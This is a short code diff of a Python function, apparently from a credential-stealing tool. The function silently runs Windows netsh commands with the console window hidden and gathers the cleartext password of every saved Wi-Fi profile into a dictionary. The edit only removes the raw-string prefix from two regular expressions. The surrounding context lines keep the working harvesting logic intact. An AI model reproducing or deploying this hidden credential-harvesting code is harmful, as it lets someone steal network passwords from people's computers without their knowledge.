@@ -10,13 +10,13 @@ def Wifi():
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
     profiles_output = check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
-    profile_names = findall(r':\s(.+)', profiles_output)
+    profile_names = findall(':\s(.+)', profiles_output)
 
     wifi_passwords = {}
 
     for profile in profile_names:
         password_output = check_output(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
-        password = search(r'Key Content\s+:\s(.+)', str(password_output))
+        password = search('Key Content\s+:\s(.+)', str(password_output))
 
         if password:
             wifi_passwords[profile] = password.group(1)
